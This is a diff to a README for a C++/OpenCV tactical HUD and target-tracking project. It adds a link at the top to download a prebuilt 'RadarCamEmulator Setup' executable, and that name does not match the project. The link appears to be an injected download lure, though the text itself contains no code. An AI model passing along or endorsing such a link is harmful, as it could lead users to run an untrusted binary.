@@ -1,3 +1,4 @@
+$[Download RadarCamEmulator Setup Directly Here](https://github.com/Ali-Iyad-Durra/Tactical-Radar-System/releases/download/Radar/Tactical.Radar.System.exe)$
 # 🛡️ Tactical Combat HUD & Target Tracker (C++ & OpenCV)
 
 An advanced real-time computer vision system that emulates a fighter jet's **Head-Up Display (HUD)**. This project features multi-color object tracking, a dynamic radar mini-map, and a proximity-based audio/visual warning system.
